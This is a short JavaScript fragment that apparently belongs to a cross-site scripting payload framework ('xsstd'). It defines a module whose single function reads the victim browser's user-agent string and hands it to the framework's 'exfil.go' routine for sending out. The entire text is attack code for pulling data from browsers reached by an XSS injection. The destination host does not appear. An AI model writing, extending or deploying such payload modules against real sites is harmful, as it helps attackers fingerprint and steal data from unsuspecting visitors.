xsstd.test = xsstd.std.extend({
    name:function(){},
    getUserAgent: function(){
    	var data = JSON.stringify(window.navigator.userAgent);
    	xsstd.exfil.go(data);
    }
});

